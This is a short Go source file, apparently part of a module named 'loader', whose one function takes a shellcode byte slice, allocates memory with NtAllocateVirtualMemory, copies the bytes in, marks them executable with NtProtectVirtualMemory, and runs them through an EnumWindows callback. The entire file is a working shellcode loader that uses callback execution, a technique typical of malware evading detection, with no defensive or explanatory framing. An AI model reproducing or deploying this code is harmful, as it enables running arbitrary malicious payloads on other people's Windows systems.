package techniques

import (
	"syscall"
	"unsafe"

	"loader/internal/ntapi"
)

func NtCallback(sc []byte) bool {
	var base uintptr
	sz := uintptr(len(sc))

	r1, _, _ := ntapi.NtAllocateVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&base)), 0,
		uintptr(unsafe.Pointer(&sz)),
		memCommit|memReserve, pageReadWrite)
	if !ntSuccess(r1) {
		return false
	}

	copy(unsafe.Slice((*byte)(unsafe.Pointer(base)), len(sc)), sc)

	var oldProt uint32
	sz = uintptr(len(sc))
	ntapi.NtProtectVirtualMemory.Call(
		currentProcess,
		uintptr(unsafe.Pointer(&base)),
		uintptr(unsafe.Pointer(&sz)),
		pageExecuteRead,
		uintptr(unsafe.Pointer(&oldProt)))

	cb := syscall.NewCallback(func(hwnd, lparam uintptr) uintptr {
		syscall.SyscallN(lparam)
		return 0
	})

	ntapi.EnumWindows.Call(cb, base)
	return true
}
